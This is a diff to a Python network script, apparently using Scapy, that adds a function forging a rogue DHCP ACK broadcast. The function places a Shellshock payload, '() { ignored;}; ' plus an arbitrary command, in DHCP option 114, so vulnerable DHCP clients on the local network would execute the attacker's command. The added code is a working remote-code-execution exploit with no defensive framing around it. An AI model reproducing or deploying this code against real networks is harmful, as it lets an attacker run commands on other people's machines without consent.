@@ -10,6 +10,23 @@ import argparse
 #xid = transaction id 
 #chaddr = clients mac address in binary format
 
+def dhcp_ack(raw_mac, xid, command):
+	packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
+	IP(src="192.168.2.1", dst='255.255.255.255') /
+	UDP(sport=67, dport=68) /
+	BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+	DHCP(options=[("message-type", "ack"),
+		('server_id', '192.168.2.1'),
+		('subnet_mask', '255.255.255.0'),
+		('router', '192.168.2.5'),
+		('lease_time', 172800),
+		('renewal_time', 86400),
+		('rebinding_time', 138240),
+		(114, "() { ignored;}; " + command),
+		"end"]))
+	return packet
+
+
 # Fixup function to extract dhcp_options by key
 def get_option(dhcp_options, key):
     must_decode = ['hostname', 'domain', 'vendor_class_id']
